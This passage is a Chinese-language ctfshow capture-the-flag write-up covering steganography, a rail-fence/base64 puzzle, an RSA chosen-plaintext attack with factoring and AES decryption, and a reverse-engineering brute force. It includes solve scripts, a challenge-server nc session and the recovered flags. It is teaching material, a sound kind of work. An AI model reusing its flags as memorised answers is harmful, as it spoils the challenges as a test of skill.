<span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS</span><br><span class="hljs-comment"># ctfshow&#123;y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="misc签到"><a class="markdownIt-Anchor" href="#misc签到"></a> misc签到</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">重要提示：<br>压缩包密码是<span class="hljs-number">5</span>位字符<br>lsb有内容<br><span class="hljs-built_in">flag</span>包含<span class="hljs-number">5</span>个空格、<span class="hljs-number">2</span>个逗号，均替换为下划线，连续只留<span class="hljs-number">1</span>个下划线<br></code></pre></td></tr></table></figure><p>压缩包直接爆破密码。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">61f@</span>X<br></code></pre></td></tr></table></figure><p>然后他说lsb里面有内容，直接stegosolve抓lsb结果啥都没找到，怀疑不会藏在中间部分了。结果看了一圈lsb都没找到有用的信息…</p><p>最后直接查看二进制的图片发现文件尾部附上了一段base64。看来做题还得走一个标准流程，指不定就忘了…</p><p>得到的base64 cyberchef转换一下。是一个缺少定位标的二维码。</p><p>先把定位标补上。嗯好像这个二维码有点不太符合规范，按理来说定位标附近实要留白的，这里确实黑色。所以现将二维码反色再添加。</p><p>得到：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">6</span>C75652C20666172206578636565647320796F75722062656C6965667D<br><span class="hljs-built_in">lue,</span> far exceeds your belief&#125;<br></code></pre></td></tr></table></figure><p>这个只是一部分的，那么还缺少一部分。</p><p>到这里只有LSB的提示没有用了，所以猜测是lsb。StegoSolve看这个二维码没找到，那应该是软件隐写。一圈软件照下来都没找到…</p><p>最后再网上搜LSB工具的时候找到个zsteg，这个我还没用过，不过看评价还挺不错？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/CTF/dsb]<br>└─$ zsteg -a download.png<br>b6,abgr,msb,xy      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,xy      .. file: , 48 kHz, Monaural<br>b8,rgb,msb,xy       .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b8,rgba,msb,xy      .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b1,r,lsb,xy,prime   .. file: MPEG ADTS, layer II, v1, 112 kbps, Stereo<br>b1,r,lsb,yx         .. text: &quot;ctfshow&#123;Your potential,va&quot;<br>b6,abgr,msb,yx      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,yx      .. file: , 48 kHz, Monaural<br><br></code></pre></td></tr></table></figure><p>这里能看到我们的flag了。好像确实挺好用的？ 工具+1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ctfshow&#123;Your potential,value, far exceeds your belief&#125;</span><br></code></pre></td></tr></table></figure><p>然后忘了换里面的字符了…</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># ctfshow&#123;Your_potential_value_far_exceeds_your_belief&#125;</span><br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="古典base"><a class="markdownIt-Anchor" href="#古典base"></a> 古典base</h2><p>我这边得到的信息是：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">YRchdsYIYNY0ZALQZYYIY0NUNQMZNNC</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>m2v3wj0zjS0j4T4DtjwiyDymy2l29g<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>可以看到两个==位置不对，能这样改变字符位置的，应该是栅栏密码，分组长度应该为2</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Y<span class="hljs-number">3</span>Rmc<span class="hljs-number">2</span>hvd<span class="hljs-number">3</span>swYjI<span class="hljs-number">0</span>Yz<span class="hljs-symbol">NjYS00</span>ZjA<span class="hljs-number">4</span>LTQ<span class="hljs-number">4</span>ZDYtYjIwYi<span class="hljs-number">0</span>y<span class="hljs-symbol">NDUyNmQyM2</span>Zl<span class="hljs-symbol">N2</span><span class="hljs-symbol">N9</span>Cg==<br></code></pre></td></tr></table></figure><p>base64解密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">0</span>b24c3ca-<span class="hljs-number">4</span>f08-<span class="hljs-number">48</span>d6-b20b-<span class="hljs-number">24526</span>d23fe7c&#125;<br></code></pre></td></tr></table></figure><h2 id="tooyoungrsa"><a class="markdownIt-Anchor" href="#tooyoungrsa"></a> TooYoungRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nevergonnagiveyouup <span class="hljs-keyword">import</span> n, e<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        flag = f.read().strip()<br><br>    k = secrets.randbelow(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ck = <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(k, e, n)&#125;</span>&quot;</span>)<br>    key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ct = <span class="hljs-subst">&#123;cipher.encrypt(pad(flag, AES.block_size)).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        nevergonnaletyoudown = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;I just wanna tell you how i&#x27;m feeling... &quot;</span>))<br>        <span class="hljs-keyword">assert</span> nevergonnaletyoudown &gt;= <span class="hljs-number">0</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gotta make you understand: <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(nevergonnaletyoudown, e, n)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>链接nc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">F:\CTFTools\yafu-1.34&gt;nc pwn.challenge.ctf.show 28155<br>ck = 53830851938944413421825489946783740501<br>ct = 2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176<br>I just wanna tell you how i&#x27;m feeling...<br>2<br>gotta make you understand: 9088662731338809664100216653347181076<br>I just wanna tell you how i&#x27;m feeling...<br>4<br>gotta make you understand: 61547101391097434247253645201221024635<br>I just wanna tell you how i&#x27;m feeling...<br>8<br>gotta make you understand: 9368775312576566895016755847461863720<br>I just wanna tell you how i&#x27;m feeling...<br>16<br>gotta make you understand: 75933324863129460082479849068964500501<br>I just wanna tell you how i&#x27;m feeling...<br></code></pre></td></tr></table></figure><p>选择明文攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> gmpy2 import gcd<br><br><span class="hljs-attribute">c2</span> = <span class="hljs-number">9088662731338809664100216653347181076</span><br><span class="hljs-attribute">c4</span> = <span class="hljs-number">61547101391097434247253645201221024635</span><br><span class="hljs-attribute">c8</span> = <span class="hljs-number">9368775312576566895016755847461863720</span><br><span class="hljs-attribute">c16</span> = <span class="hljs-number">75933324863129460082479849068964500501</span><br><br><span class="hljs-attribute">dif1</span> = pow(c2,<span class="hljs-number">2</span>) - c4<br><span class="hljs-attribute">dif2</span> = pow(c2,<span class="hljs-number">3</span>) - c8<br><span class="hljs-attribute">dif3</span> = pow(c2,<span class="hljs-number">4</span>) - c16<br><br><br><span class="hljs-attribute">n</span> = gcd(gcd(dif1,dif2), gcd(dif2,dif3))<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> pow(<span class="hljs-number">2</span>, e, n) != c2:<br>    <span class="hljs-attribute">e</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;e = &quot;</span>, e)<br><br><span class="hljs-comment"># n =  190128968349217409128719777740062362481</span><br><span class="hljs-comment"># e =  652019</span><br></code></pre></td></tr></table></figure><p>这里其实只用两个dif做GCD也可以的。如果e跑的时间比较久的话，可以考虑重新获取数据，重新连一下nc，他会重新生成n和e的。</p><p>得到的n用yafu分解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">starting SIQS on c39: 190128968349217409128719777740062362481<br><br>==== sieving in progress (1 thread):     624 relations needed ====<br>====           Press ctrl-c to abort and save state           ====<br>518 rels found: 285 full + 233 from 2212 partial, (30808.14 rels/sec)<br><br>SIQS elapsed time = 0.1090 seconds.<br>Total factoring time = 0.2692 seconds<br><br><br>***factors found***<br><br>P20 = 14093563172030264239<br>P20 = 13490482571968928479<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>最后求d，然后AES解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd, invert, powmod<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>n =  <span class="hljs-number">190128968349217409128719777740062362481</span><br>p = <span class="hljs-number">14093563172030264239</span><br>q = <span class="hljs-number">13490482571968928479</span><br>e =  <span class="hljs-number">652019</span><br><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>ck = <span class="hljs-number">53830851938944413421825489946783740501</span><br>ct = <span class="hljs-string">&quot;2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176&quot;</span><br><br>k = powmod(ck,d,n)<br>key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br><br><span class="hljs-built_in">print</span>(cipher.decrypt(<span class="hljs-built_in">bytes</span>.fromhex(ct)))<br><br><span class="hljs-comment"># ctfshow&#123;8dcb976f-5e92-4d36-89ac-c2273bf442e1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="re签到"><a class="markdownIt-Anchor" href="#re签到"></a> re签到</h2><p>IDA打开里面有个很像base64的字符串，拉出来base64解密即可得到flag。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">V2toT2FWZ3pTbXhZTTA1d1dqSTFabUZYTldaaFNFNTZZek5PZW1NelRucGpkejA5<br><span class="hljs-section">decode:</span><br>WkhOaVgzSmxYM05wWjI1ZmFXNWZhSE56YzNOemMzTnpjdz09<br><span class="hljs-section">decode:</span><br>ZHNiX3JlX3NpZ25faW5faHNzc3Nzc3Nzcw==<br><span class="hljs-section">decode:</span><br>dsb_re_sign_in_hsssssssss<br><br><span class="hljs-comment"># ctfshow&#123;dsb_re_sign_in_hsssssssss&#125;</span><br></code></pre></td></tr></table></figure><h2 id="magic"><a class="markdownIt-Anchor" href="#magic"></a> magic</h2><p>题目信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>个密码只有<span class="hljs-number">1</span>个是正确的<br></code></pre></td></tr></table></figure><p>逆向。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;plz input your password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkToken(v5) )<br>    <span class="hljs-built_in">puts</span>(aCongratulation);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;password is incorrect!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入checkToken函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkToken</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkSum(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)p(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)h(a1);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里返回一个bool根据判断条件，这里要这三个都为真才可以。</p><p>进入第一个checkSum。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkSum</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+10h] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 += a1 % <span class="hljs-number">10</span>;<br>    a1 /= <span class="hljs-number">10</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3 == <span class="hljs-number">58</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个是判断a1这个数的所有十进制位的数字之和是不是58。</p><p>进入p函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">p</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">2</span>; <span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)a1) &gt;= (<span class="hljs-type">double</span>)i; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !(a1 % i) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>素数判定函数。</p><p>进入h函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">h</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = a1;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v2 /= <span class="hljs-number">10</span>;<br>    ++v4;<br>  &#125;<br>  v3 = a1;<br>  <span class="hljs-keyword">while</span> ( v3 )<br>  &#123;<br>    v5 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 / <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)));<br>    v6 = v3 % <span class="hljs-number">10</span>;<br>    v3 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 - <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)) * (<span class="hljs-type">double</span>)v5) / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v5 != v6 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    v4 -= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断这个数是不是一个回文数。</p><p>所以这个数有三个条件，他是一个回文素数，同时他的所有位之和为58。接下来写个脚本来跑。为了时间上能更快，我们先生成回文数，在判断这个数是不是素数，再判断和是否为58。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-comment"># 位数之和为58</span><br><span class="hljs-comment"># 是一个素数</span><br><span class="hljs-comment"># 是一个回文数</span><br><span class="hljs-comment"># 如果位数之和为58至少需要6位，一个int有10位，所以可选的部分位6,7,8,9,10位</span><br>Palind = []<br><br><span class="hljs-comment"># 6 位 回文数</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            temp = <span class="hljs-number">100001</span>*n+<span class="hljs-number">10010</span>*m+<span class="hljs-number">1100</span>*k<br>            <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                Palind.append(temp)<br><span class="hljs-comment"># 7位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">1000001</span>*n+<span class="hljs-number">100010</span>*m+<span class="hljs-number">10100</span>*k+<span class="hljs-number">1000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 8位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">10000001</span>*n+<span class="hljs-number">1000010</span>*m+<span class="hljs-number">100100</span>*k+<span class="hljs-number">11000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 9位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                    temp = <span class="hljs-number">100000001</span>*n+<span class="hljs-number">10000010</span>*m+<span class="hljs-number">1000100</span>*k+<span class="hljs-number">101000</span>*p+<span class="hljs-number">10000</span>*q<br>                    <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                        Palind.append(temp)<br>                    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Palind:<br>    mydigit = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>,<span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(i)))))<br>    <span class="hljs-keyword">if</span> mydigit == <span class="hljs-number">58</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>跑完之后有很多结果。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">9888889</span><br><span class="hljs-number">9896989</span><br><span class="hljs-number">9978799</span><br><span class="hljs-number">178989871</span><br><span class="hljs-number">179969971</span><br><span class="hljs-number">188888881</span><br><span class="hljs-number">189787981</span><br>...<br>...<br>...<br></code></pre></td></tr></table></figure><p>回到提示信息，三个密码只有一个是正确的。在我们的输出结果中，七位的满足要求的数只有三个，猜测可能就是这三个其中的一个。</p><p>尝试了一下第一个数，发现就是flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>: ctfshow&#123;<span class="hljs-number">9888889</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="pwn签到"><a class="markdownIt-Anchor" href="#pwn签到"></a> pwn签到</h2><p>IDA打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 